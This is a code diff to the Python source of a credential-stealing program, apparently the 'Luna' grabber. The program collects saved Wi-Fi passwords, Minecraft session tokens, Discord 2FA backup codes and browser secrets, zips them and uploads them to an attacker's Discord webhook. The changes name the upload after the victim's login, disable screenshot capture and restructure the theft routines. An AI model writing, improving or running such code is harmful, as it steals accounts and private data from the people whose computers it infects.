@@ -15,7 +15,7 @@ from zipfile import ZIP_DEFLATED, ZipFile
 import psutil
 import requests
 from Crypto.Cipher import AES
-from PIL import ImageGrab
+#from PIL import ImageGrab
 from requests_toolbelt.multipart.encoder import MultipartEncoder
 from win32crypt import CryptUnprotectData
 
@@ -77,7 +77,7 @@ def main(webhook: str):
 
     if __CONFIG__["roblox"] or __CONFIG__["browser"] or __CONFIG__["wifi"] or __CONFIG__["minecraft"] or __CONFIG__["backupcodes"]:
         with open(_file, 'rb') as file:
-            encoder = MultipartEncoder({'payload_json': json.dumps(data), 'file': ('Luna-Logged.zip', file, 'application/zip')})
+            encoder = MultipartEncoder({'payload_json': json.dumps(data), 'file': (f'Luna-Logged-{os.getlogin()}.zip', file, 'application/zip')})
             requests.post(webhook, headers={'Content-type': encoder.content_type}, data=encoder)
     else:
         requests.post(webhook, json=data)
@@ -508,14 +508,14 @@ class Discord:
 
         self.robloxinfo(webhook)
 
-        image = ImageGrab.grab(
-            bbox=None,
-            all_screens=True,
-            include_layered_windows=False,
-            xdisplay=None
-        )
-        image.save(temp_path + "\\desktopshot.png")
-        image.close()
+        # image = ImageGrab.grab(
+        #    bbox=None,
+        #    all_screens=True,
+        #    include_layered_windows=False,
+        #    xdisplay=None
+        # )
+        #image.save(temp_path + "\\desktopshot.png")
+        # image.close()
 
 
 class Browsers:
@@ -697,17 +697,13 @@ class Wifi:
         self.wifi_list = []
         self.name_pass = {}
 
-        os.makedirs(os.path.join(temp_path, "Wifi"), exist_ok=True)
-
         data = subprocess.getoutput('netsh wlan show profiles').split('\n')
         for line in data:
             if 'All User Profile' in line:
                 self.wifi_list.append(line.split(":")[-1][1:])
-            else:
-                with open(os.path.join(temp_path, "Wifi", "Wifi Passwords.txt"), 'w', encoding="utf-8") as f:
-                    f.write(f'There is no wireless interface on the system. Ethernet using twat.')
-                f.close()
+                self.wifi_info()
 
+    def wifi_info(self):
         for i in self.wifi_list:
             command = subprocess.getoutput(
                 f'netsh wlan show profile "{i}" key=clear')
@@ -719,7 +715,7 @@ class Wifi:
             else:
                 key = ""
                 self.name_pass[i] = key
-
+        os.makedirs(os.path.join(temp_path, "Wifi"), exist_ok=True)
         with open(os.path.join(temp_path, "Wifi", "Wifi Passwords.txt"), 'w', encoding="utf-8") as f:
             for i, j in self.name_pass.items():
                 f.write(f'Wifi Name : {i} | Password : {j}\n')
@@ -731,30 +727,27 @@ class Minecraft:
         self.roaming = os.getenv("appdata")
         self.accounts_path = "\\.minecraft\\launcher_accounts.json"
         self.usercache_path = "\\.minecraft\\usercache.json"
-        self.error_message = "No minecraft accounts or access tokens :("
 
-        os.makedirs(os.path.join(temp_path, "Minecraft"), exist_ok=True)
-        self.session_info()
-        self.user_cache()
+        if os.path.exists(os.path.join(self.roaming, ".minecraft")):
+            os.makedirs(os.path.join(temp_path, "Minecraft"), exist_ok=True)
+            try:
+                self.session_info()
+                self.user_cache()
+            except Exception as e:
+                print(e)
 
     def session_info(self):
         with open(os.path.join(temp_path, "Minecraft", "Session Info.txt"), 'w', encoding="cp437") as f:
-            if os.path.exists(self.roaming + self.accounts_path):
-                with open(self.roaming + self.accounts_path, "r") as g:
-                    self.session = json.load(g)
-                    f.write(json.dumps(self.session, indent=4))
-            else:
-                f.write(self.error_message)
+            with open(self.roaming + self.accounts_path, "r") as g:
+                self.session = json.load(g)
+                f.write(json.dumps(self.session, indent=4))
         f.close()
 
     def user_cache(self):
         with open(os.path.join(temp_path, "Minecraft", "User Cache.txt"), 'w', encoding="cp437") as f:
-            if os.path.exists(self.roaming + self.usercache_path):
-                with open(self.roaming + self.usercache_path, "r") as g:
-                    self.user = json.load(g)
-                    f.write(json.dumps(self.user, indent=4))
-            else:
-                f.write(self.error_message)
+            with open(self.roaming + self.usercache_path, "r") as g:
+                self.user = json.load(g)
+                f.write(json.dumps(self.user, indent=4))
         f.close()
 
 
@@ -762,20 +755,17 @@ class BackupCodes:
     def __init__(self):
         self.path = os.environ["HOMEPATH"]
         self.code_path = '\\Downloads\\discord_backup_codes.txt'
-
-        os.makedirs(os.path.join(temp_path, "Discord"), exist_ok=True)
         self.get_codes()
 
     def get_codes(self):
-        with open(os.path.join(temp_path, "Discord", "2FA Backup Codes.txt"), "w", encoding="utf-8", errors='ignore') as f:
-            if os.path.exists(self.path + self.code_path):
+        if os.path.exists(self.path + self.code_path):
+            os.makedirs(os.path.join(temp_path, "Discord"), exist_ok=True)
+            with open(os.path.join(temp_path, "Discord", "2FA Backup Codes.txt"), "w", encoding="utf-8", errors='ignore') as f:
                 with open(self.path + self.code_path, 'r') as g:
                     for line in g.readlines():
                         if line.startswith("*"):
                             f.write(line)
-            else:
-                f.write("No discord backup codes found")
-        f.close()
+            f.close()
 
 
 class AntiSpam:
